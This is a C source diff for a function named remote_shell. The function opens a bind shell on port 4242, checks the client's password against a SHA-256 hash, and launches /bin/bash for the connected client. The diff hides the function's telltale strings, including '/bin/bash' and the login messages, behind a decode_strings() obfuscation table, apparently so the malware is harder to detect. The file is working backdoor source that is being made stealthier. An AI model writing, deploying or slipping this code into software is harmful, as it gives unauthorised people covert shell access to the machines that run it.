@@ -1,3 +1,4 @@
+#include "constants.h"
 #include "digest.h"
 #include "mem.h"
 #include "shield.h"
@@ -45,6 +46,8 @@ remote_shell(char **env) {
     int server_fd = -1, client_fd = -1;
     const struct sockaddr_in address = {.sin_family = AF_INET, .sin_addr.s_addr = INADDR_ANY, .sin_port = htons(4242)};
 
+    decode_strings(strings, sizeof(strings) / sizeof(strings[0]));
+
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
 
     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
@@ -74,7 +77,7 @@ remote_shell(char **env) {
         sha256_stream_update(&ctx, (uint8_t *)buf, read_bytes);
         sha256_stream_final(&ctx, pwd_sha);
         if (ft_memcmp(PWD_SHA256, pwd_sha, sizeof(PWD_SHA256)) == 0) {
-            if (send(client_fd, "Login successful\n", 17, 0) == -1) {
+            if (send(client_fd, (char *)strings[LOGIN_SUCCESSFUL].data, 17, 0) == -1) {
                 __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
                 goto client_error;
             }
@@ -86,7 +89,7 @@ remote_shell(char **env) {
         while (recv(client_fd, discard, sizeof(discard), MSG_DONTWAIT) > 0)
             ;
 
-        if (send(client_fd, "Invalid password, try again\n", 28, 0) == -1) {
+        if (send(client_fd, (char *)strings[INVALID_PASSWORD_TRY_AGAIN].data, 28, 0) == -1) {
             __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
             goto client_error;
         }
@@ -105,7 +108,7 @@ remote_shell(char **env) {
         goto client_error;
     }
 
-    const char *bash_exec_path = "/bin/bash";
+    const char *bash_exec_path = (char *)strings[BIN_BASH].data;
     const char *args[2] = {bash_exec_path, NULL};
 
     execve(bash_exec_path, (char *const *)args, env);
